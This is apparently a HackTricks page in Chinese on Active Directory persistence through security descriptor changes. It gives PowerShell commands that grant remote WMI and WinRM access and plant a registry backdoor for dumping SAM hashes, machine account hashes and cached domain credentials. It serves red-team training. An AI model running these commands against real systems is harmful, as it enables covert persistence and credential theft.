# 安全描述符

{{#include ../../banners/hacktricks-training.md}}

## 安全描述符

[来自文档](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language)：安全描述符定义语言（SDDL）定义了用于描述安全描述符的格式。SDDL使用ACE字符串用于DACL和SACL：`ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`

**安全描述符**用于**存储**一个**对象**对另一个**对象**的**权限**。如果您可以在一个对象的**安全描述符**中**做出一点改变**，您可以在不需要成为特权组成员的情况下获得对该对象非常有趣的权限。

因此，这种持久性技术基于赢得对某些对象所需的每个权限的能力，以便能够执行通常需要管理员权限的任务，但不需要成为管理员。

### 访问WMI

您可以给用户访问**远程执行WMI**的权限 [**使用这个**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)：
```bash
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc –namespace 'root\cimv2' -Verbose
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc–namespace 'root\cimv2' -Remove -Verbose #Remove
```
### 访问 WinRM

给用户提供 **winrm PS 控制台的访问权限** [**使用这个**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)**:**
```bash
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remove
```
### 远程访问哈希

访问 **registry** 并 **dump hashes** 创建一个 **Reg backdoor using** [**DAMP**](https://github.com/HarmJ0y/DAMP)**,** 这样你可以随时检索 **计算机的哈希**、**SAM** 以及计算机中的任何 **缓存的 AD** 凭据。因此，将此权限授予 **普通用户对域控制器计算机** 是非常有用的：
```bash
# allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.
Get-RemoteMachineAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local SAM account hashes for the specified machine.
Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
```
查看 [**Silver Tickets**](silver-ticket.md) 以了解如何使用域控制器计算机帐户的哈希值。

{{#include ../../banners/hacktricks-training.md}}
